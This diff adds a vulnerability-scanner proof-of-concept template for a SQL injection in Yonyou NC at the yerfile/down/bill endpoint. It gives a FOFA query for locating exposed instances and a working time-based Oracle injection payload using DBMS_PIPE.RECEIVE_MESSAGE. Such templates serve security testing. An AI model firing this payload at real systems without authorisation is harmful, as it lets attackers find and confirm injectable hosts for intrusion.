@@ -1,0 +1,23 @@
+id: poc-yaml-yongyou-nc-yerfile-sqli
+info:
+  name: 用友NC yerfile SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"Yonyou NC")
+- method: POST
+  path: /portal/pt/yerfile/down/bill?pageId=login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{{.t1}})--
+  expression: status_code == 500 && contains(body,"error") && duration > t1 && duration
+    < t2
+transport: http
